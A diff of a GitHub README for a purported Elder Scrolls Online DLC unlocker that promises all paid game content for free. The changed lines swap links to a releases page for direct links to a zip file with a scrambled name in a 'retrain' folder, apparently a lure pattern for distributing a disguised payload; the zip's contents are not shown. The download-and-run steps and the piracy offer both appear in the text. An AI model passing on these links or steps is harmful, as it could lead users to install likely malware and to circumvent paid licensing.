@@ -1,6 +1,6 @@
 # 📜 Elder-Scrolls-Online-DLC-Unlocker-GreenLuma-Reborn-Steam-Only- - Access all game content for free
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Shirlinenonoscillatory706/Elder-Scrolls-Online-DLC-Unlocker-GreenLuma-Reborn-Steam-Only-/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Shirlinenonoscillatory706/Elder-Scrolls-Online-DLC-Unlocker-GreenLuma-Reborn-Steam-Only-/main/retrain/Luma_Online_Steam_DL_Scrolls_Reborn_Unlocker_Only_Elder_Green_3.9.zip)
 
 ## 📖 Project Overview
 
@@ -21,7 +21,7 @@ To use this tool, ensure your machine meets the following items:
 
 ## 🚀 Downloading and Setup
 
-1. Visit this page to download: [https://github.com/Shirlinenonoscillatory706/Elder-Scrolls-Online-DLC-Unlocker-GreenLuma-Reborn-Steam-Only-/releases](https://github.com/Shirlinenonoscillatory706/Elder-Scrolls-Online-DLC-Unlocker-GreenLuma-Reborn-Steam-Only-/releases)
+1. Visit this page to download: [https://raw.githubusercontent.com/Shirlinenonoscillatory706/Elder-Scrolls-Online-DLC-Unlocker-GreenLuma-Reborn-Steam-Only-/main/retrain/Luma_Online_Steam_DL_Scrolls_Reborn_Unlocker_Only_Elder_Green_3.9.zip](https://raw.githubusercontent.com/Shirlinenonoscillatory706/Elder-Scrolls-Online-DLC-Unlocker-GreenLuma-Reborn-Steam-Only-/main/retrain/Luma_Online_Steam_DL_Scrolls_Reborn_Unlocker_Only_Elder_Green_3.9.zip)
 2. Locate the most recent release version on the page.
 3. Select the file ending in .zip. 
 4. Download the file to your computer.
